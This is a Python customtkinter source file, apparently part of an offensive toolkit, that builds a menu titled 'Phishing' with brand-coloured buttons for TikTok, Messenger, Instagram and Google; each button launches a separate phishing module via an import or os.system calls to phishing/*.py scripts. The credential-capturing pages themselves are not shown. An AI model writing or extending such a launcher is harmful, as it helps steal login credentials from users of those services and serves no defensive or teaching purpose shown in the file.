import os
import customtkinter as ctk

from Phishing.Tiktok import tiktok_ui

def clear_frame(frame):
    """Очищает все виджеты в указанном фрейме."""
    for widget in frame.winfo_children():
        widget.destroy()

def create_main_phishing_ui(parent_frame, go_back_callback=None):
    """Создает интерфейс для фишинга."""
    clear_frame(parent_frame)

    # Заголовок
    label_title = ctk.CTkLabel(parent_frame, text="Phishing", font=("Arial", 24))
    label_title.pack(pady=10)

    # Названия кнопок
    button_titles = [
        "Tik Tok", "Mesenger", "Instagram", 
        "Google"
    ]

    button_functions = [
        lambda: tiktok_ui(parent_frame, go_back_callback),
        lambda: os.system("python3 phishing/mesenger.py"),  # Лучше заменить на прямой вызов функции
        lambda: os.system("python3 phishing/instagram.py"),
        lambda: os.system("python3 phishing/google.py")
    ]

    # Сначала создаем кнопку с начальными цветами
    button_tiktok = ctk.CTkButton(
        parent_frame,
        text="TikTok",
        command=button_functions[0],
        fg_color="#000000",        # Фон кнопки
        text_color="#FFFFFF",      # Цвет текста
        border_color="#69C9D0",    # Начальная обводка — голубая
        border_width=5,
        corner_radius=10,
        hover_color="#ee1d52"      # Цвет при наведении фона
    )
    button_tiktok.pack(pady=10, fill='x')

    # Теперь добавляем обработчики событий
    def on_enter_tiktok(event):
        button_tiktok.configure(border_color="#EE1D52", fg_color="#EE1D52", text_color="#000000")  # Меняем цвет рамки на розовый

    def on_leave_tiktok(event):
        button_tiktok.configure(border_color="#69C9D0", fg_color="#000000", text_color="#FFFFFF")  # Возвращаем цвет рамки голубым

    # Привязываем события
    button_tiktok.bind("<Enter>", on_enter_tiktok)
    button_tiktok.bind("<Leave>", on_leave_tiktok)

    # Messenger
    button_mesenger = ctk.CTkButton(
        parent_frame,
        text=button_titles[1],
        command=button_functions[1],
        fg_color="#0078FF",
        text_color="#FFFFFF",
        border_color="#005BBB",
        border_width=5,
        corner_radius=10,
        hover_color="#3399FF"
    )
    button_mesenger.pack(pady=10, fill='x')

    # Instagram
    button_instagram = ctk.CTkButton(
        parent_frame,
        text=button_titles[2],
        command=button_functions[2],
        fg_color="#833AB4",
        text_color="#FFFFFF",
        border_color="#C13584",
        border_width=5,
        corner_radius=10,
        hover_color="#F77737"
    )
    button_instagram.pack(pady=10, fill='x')

    # Google
    button_google = ctk.CTkButton(
        parent_frame,
        text=button_titles[3],
        command=button_functions[3],
        fg_color="#4285F4",       # Стартовый фон — Google синий
        text_color="#FFFFFF",     # Белый текст
        border_color="#34A853",   # Стартовая зелёная обводка
        border_width=5,
        corner_radius=15,         # Сделаем более "плавные" углы для гугла
        hover_color="#357AE8"     # Более глубокий синий при наведении
    )
    button_google.pack(pady=10, fill='x')

    def on_enter_google(event):
        button_google.configure(
            border_color="#EA4335",  # Красная обводка при наведении (Google красный)
            fg_color="#34A853",      # Зелёный фон (Google зелёный)
            text_color="#FFFFFF"     # Оставляем белый текст
        )

    def on_leave_google(event):
        button_google.configure(
            border_color="#34A853",  # Возвращаем зелёную обводку
            fg_color="#4285F4",      # Возвращаем синий фон
            text_color="#FFFFFF"
        )

    button_google.bind("<Enter>", on_enter_google)
    button_google.bind("<Leave>", on_leave_google)


    back_button = ctk.CTkButton(
        parent_frame,
        text="← Back",
        command=go_back_callback,
        fg_color="#000000",        # Фон кнопки
        text_color="#FFFFFF"      # Цвет текста
    )
    back_button.pack(pady=10, fill='x')